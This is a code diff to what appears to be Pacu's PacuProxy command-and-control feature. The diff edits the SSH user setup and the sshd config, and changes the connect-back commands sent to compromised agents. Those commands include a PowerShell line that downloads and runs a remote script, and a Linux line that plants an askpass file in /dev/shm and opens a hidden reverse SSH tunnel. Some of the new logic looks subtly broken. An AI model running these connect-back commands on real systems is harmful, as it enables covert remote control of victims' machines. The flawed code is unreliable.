@@ -426,7 +426,7 @@ class Main:
                         except Exception as error:
                             self.print('Failed to add a password...\n')
                             return username, None, True
-                        return username, password, True
+                        return username, password, update_sshd_config
                     except Exception as error:
                         self.print('Failed to find user after creation. Here is the output from the command "id -u {}": {}\n'.format(username, user_id))
                         return None, None, False
@@ -457,6 +457,31 @@ class Main:
                     return self.get_ssh_user(None, None)
                 else:
                     return None, None, False
+
+
+    def update_sshd_config(self):
+        self.print('Ensuring that local port forwarding is disabled (to prevent a "hack back" scenario)...')
+        action = ''
+        with open('/etc/ssh/sshd_config', 'r') as config_file:
+            contents = config_file.read()
+            if 'AllowTcpForwarding' in contents:
+                if 'AllowTcpForwarding remote' in contents:
+                    self.print('Already disabled.')
+                else:
+                    action = 'replace'
+            else:
+                action = 'add'
+
+        with open('/etc/ssh/sshd_config', 'w') as config_file:
+            if action == 'replace':
+                contents = re.sub(r'.*AllowTcpForwarding.*', 'AllowTcpForwarding remote', contents)
+                config_file.write(contents)
+                return True
+            elif action == 'add':
+                contents += '\nAllowTcpForwarding remote'
+                config_file.write(contents)
+                return True
+        return False
 
     # Pacu commands and execution
 
@@ -511,7 +536,7 @@ class Main:
                 'Port': proxy_settings.port,
                 'Listening': proxy_settings.listening,
                 'SSHUsername': proxy_settings.ssh_username,
-                'SSHPrivateKey': proxy_settings.ssh_priv_key,
+                'SSHPassword': proxy_settings.ssh_password,
                 'TargetAgent': copy.deepcopy(proxy_settings.target_agent)
             }
             self.print(proxy)
@@ -523,7 +548,7 @@ class Main:
                     'Port': proxy_settings.port,
                     'Listening': proxy_settings.listening,
                     'SSHUsername': proxy_settings.ssh_username,
-                    'SSHPrivateKey': proxy_settings.ssh_priv_key,
+                    'SSHPassword': proxy_settings.ssh_password,
                     'TargetAgent': copy.deepcopy(proxy_settings.target_agent)
                 }
                 self.print(proxy)
@@ -637,8 +662,13 @@ class Main:
         elif command[1] == 'use':
             if len(command) == 3:
                 try:
+                    proxy_target_agent = self.server.all_addresses[int(command[2])]
                     if command[2] == 'none':
                         self.print('** No longer using a remote PacuProxy agent to route commands. **')
+                        if proxy_target_agent[-1].startswith('Windows'):
+                            self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[int(command[2])], 'Stop-PortForwardJobs')
+                        else:
+                            self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[int(command[2])], 'kill -9 $! && rm /dev/shm/{}'.format(proxy_settings.ssh_shm_name))
                         proxy_target_agent = []
                     else:
                         if platform.system() == 'Windows':
@@ -651,12 +681,10 @@ class Main:
                             self.print('** Invalid agent ID, expected an integer or "none", received: {} **'.format(command[2]))
                             return
 
-                        proxy_target_agent = self.server.all_addresses[int(command[2])]
-
                         print('Setting proxy target to agent {}...'.format(command[2]))
 
                         # Find or create an SSH user
-                        proxy_ssh_username, proxy_ssh_password, new = self.get_ssh_user(proxy_ssh_username, proxy_ssh_password)
+                        proxy_ssh_username, proxy_ssh_password, restart_sshd = self.get_ssh_user(proxy_ssh_username, proxy_ssh_password)
                         if proxy_ssh_username is None:
                             self.print('No SSH user on the local PacuProxy server, not routing traffic through the target agent.')
                             return
@@ -665,7 +693,7 @@ class Main:
                             return
 
                         # If an SSH user was just generated, make sure local port forwarding is disabled
-                        if new is True:
+                        if restart_sshd is True:
                             self.print('SSH user setup successfully. It is highly recommended to restart your sshd service before continuing. Part of the SSH user creation process was to restrict access to local port forwarding, but this change requires an sshd restart. If local port forwarding is not disabled, your target machine can "hack back" by forwarding your local ports to their machine and accessing the services hosted on them. This can be done on most systems by running "service sshd restart".\n')
                             proxy_settings.update(self.database, ssh_username=proxy_ssh_username, ssh_password=proxy_ssh_password)
                             restart_sshd = self.input('  Do you want Pacu to restart sshd (Warning: If you are currently connected to your server over SSH, you may lose your connection)? Press enter if so, enter "ignore" to ignore this warning, or press Ctrl+C to exit and restart it yourself (Enter/ignore/Ctrl+C): ')
@@ -722,7 +750,8 @@ class Main:
 
                             connect_back_cmd = 'iex ((New-Object System.Net.WebClient).DownloadString("http://{}:{}/{}")); Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_port, secret_string, proxy_ip, proxy_ssh_username, proxy_ssh_password)
                         else:
-                            connect_back_cmd = 'echo {} | ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 8001 {}@{} >/dev/null 2>&1 &'.format(proxy_ssh_password, proxy_ssh_username, proxy_ip)
+                            shm_name =  ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=5))
+                            connect_back_cmd = 'echo "echo {}" > /dev/shm/{} && chmod 777 /dev/shm/{} && DISPLAY=dummy SSH_ASKPASS=/dev/shm/{} setsid ssh -o UserKnownHostsFile=/dev/null -f -N -R 8001 -oStrictHostKeyChecking=no {}@{} >/dev/null 2>&1 &'.format(proxy_ssh_password, shm_name, shm_name, shm_name, proxy_ssh_username, proxy_ip)
                         self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[int(command[2])], connect_back_cmd)
                         self.print('Remote agent instructed to connect!')
                 except Exception as error:
@@ -731,7 +760,7 @@ class Main:
                 self.print('** Incorrect input, excepted an agent ID, received: {}'.format(command[2:]))
         else:
             self.print('** Unrecognized proxy command: {} **'.format(command[1]))
-        proxy_settings.update(self.database, ssh_username=proxy_ssh_username, ssh_password=proxy_ssh_password, listening=proxy_listening, target_agent=proxy_target_agent)
+        proxy_settings.update(self.database, ssh_username=proxy_ssh_username, ssh_password=proxy_ssh_password, ssh_shm_name=shm_name, listening=proxy_listening, target_agent=proxy_target_agent)
         return
 
     def parse_exec_module_command(self, command):
